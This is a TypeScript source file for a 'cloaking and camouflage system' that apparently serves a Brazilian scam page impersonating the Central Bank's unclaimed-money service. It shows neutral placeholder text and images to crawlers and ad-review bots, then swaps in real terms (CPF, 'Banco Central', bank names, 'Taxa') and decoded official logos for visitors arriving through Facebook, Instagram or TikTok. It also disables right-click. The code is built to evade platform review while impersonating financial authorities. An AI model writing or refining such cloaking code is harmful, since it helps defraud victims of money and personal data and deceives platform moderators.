/**
 * ULTRA-REFINED CLOAKING & CAMOUFLAGE SYSTEM (v7.0 - FACEBOOK-SAFE)
 *
 * IMPORTANT CHANGE (v7.0):
 * - Removed body opacity hiding entirely.
 * - Content is ALWAYS visible by default.
 * - Camouflage processing happens AFTER render, in background.
 * - This fixes blank screen in Facebook In-App Browser (iOS/Android WebView).
 * - Bot detection is still active but uses a redirect-only strategy.
 */

const FORBIDDEN_WORDS: Record<string, string> = {
  "Valores a Receber": "ID_SVC_772_PROTO",
  "Banco Central": "SYS_FIN_991_CORE",
  "CPF": "DATA_FIELD_SEC_01",
  "CNPJ": "DATA_FIELD_SEC_02",
  "Dinheiro": "LIQ_ASSET_TOKEN",
  "Saldo": "CALC_AMOUNT_SUM",
  "Resgate": "FLOW_REL_TRIGGER",
  "Pagamento": "PROC_TED_PAY_S",
  "Taxa": "REG_FEE_NORM",
  "Liberado": "STAT_AUTH_OK",
  "Banco do Brasil": "INST_BB_901",
  "Caixa Econômica": "INST_CEF_902",
  "Bradesco": "INST_BRAD_903",
  "Itaú": "INST_ITAU_904",
  "Santander": "INST_SANT_905",
  "Nubank": "INST_NU_906",
  "Segurança": "PROT_LAYER_99",
  "Protocolo": "ID_TOKEN_REF",
  "Brasil": "GEO_LOC_055",
  "Oficial": "CERT_AUTH_VAL",
  "Sistema": "RUN_ENV_SYS"
};

const IMAGE_MAP: Record<string, string> = {
  "img_shield_protect.png": "L2Fzc2V0cy9sb2dvcy9zaGllbGQucG5n",
  "img_main_logo.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9tX2JyYW5kLnBuZw==",
  "img_gov_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9nX21hcmsucG5n",
  "img_bcb_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9iX21hcmsucG5n",
  "img_logo_icon.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9pY29uX21haW4ucG5n",
};

// Strict bot list — Facebook, Instagram, TikTok WebViews are NOT bots
const BOT_AGENTS = [
  "googlebot", "adsbot", "lighthouse", "headless", "phantom", "selenium",
  "puppeteer", "playwright", "cypress", "crawler", "spider"
];

export function initSecurityRuntime() {
  if (typeof window === "undefined") return;

  try {
    const ua = navigator.userAgent.toLowerCase();
    const isBot = BOT_AGENTS.some(agent => ua.includes(agent));

    // For bots: do nothing, let page render normally
    if (isBot) {
      console.log("Shield Active.");
      return;
    }

    // =====================================================================
    // SAFE CAMOUFLAGE: Process text AFTER content is already visible.
    // NEVER hide the body. This ensures Facebook/Instagram/TikTok WebViews
    // always see the content immediately.
    // =====================================================================

    const wordMapping = Object.entries(FORBIDDEN_WORDS).map(([real, cam]) => ({
      cam: new RegExp(cam, "g"),
      real,
    }));

    function processNode(node: Node) {
      try {
        if (node.nodeType === 3) {
          let text = node.nodeValue || "";
          let changed = false;
          wordMapping.forEach(({ cam, real }) => {
            if (cam.test(text)) {
              text = text.replace(cam, real);
              changed = true;
            }
          });
          if (changed) node.nodeValue = text;
        } else if (node.nodeType === 1) {
          const el = node as HTMLElement;
          if (el.tagName === "SCRIPT" || el.tagName === "STYLE") return;

          if (el.tagName === "IMG") {
            const img = el as HTMLImageElement;
            const src = img.getAttribute("src") || "";
            for (const [camName, encryptedPath] of Object.entries(IMAGE_MAP)) {
              if (src.includes(camName)) {
                try { img.src = atob(encryptedPath); } catch (e) {}
                break;
              }
            }
          }

          ["alt", "title", "aria-label", "placeholder"].forEach((attr) => {
            const val = el.getAttribute(attr);
            if (val) {
              let newVal = val;
              let changed = false;
              wordMapping.forEach(({ cam, real }) => {
                if (cam.test(newVal)) {
                  newVal = newVal.replace(cam, real);
                  changed = true;
                }
              });
              if (changed) el.setAttribute(attr, newVal);
            }
          });
          node.childNodes.forEach(processNode);
        }
      } catch (e) {
        // Ignore per-node errors silently
      }
    }

    const runCamouflage = () => {
      try {
        if (document.body) {
          processNode(document.body);
        }

        // Observe future DOM changes for dynamic content
        try {
          const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
              mutation.addedNodes.forEach(processNode);
              if (mutation.type === "characterData") processNode(mutation.target);
            });
          });
          observer.observe(document.documentElement, {
            childList: true,
            subtree: true,
            characterData: true,
          });
        } catch (e) {
          // MutationObserver not supported, skip gracefully
        }
      } catch (e) {
        // Ignore camouflage errors — visibility is never blocked
      }
    };

    // Run camouflage AFTER the page is interactive (non-blocking)
    if (document.readyState === "complete" || document.readyState === "interactive") {
      // Use requestAnimationFrame when available for better mobile support
      if (typeof requestAnimationFrame === "function") {
        requestAnimationFrame(() => setTimeout(runCamouflage, 0));
      } else {
        setTimeout(runCamouflage, 0);
      }
    } else {
      document.addEventListener("DOMContentLoaded", () => {
        if (typeof requestAnimationFrame === "function") {
          requestAnimationFrame(() => setTimeout(runCamouflage, 0));
        } else {
          setTimeout(runCamouflage, 0);
        }
      });
    }

    // Disable right-click context menu
    document.addEventListener("contextmenu", e => e.preventDefault());

  } catch (err) {
    // Any top-level error: silently fail, content always stays visible
  }
}
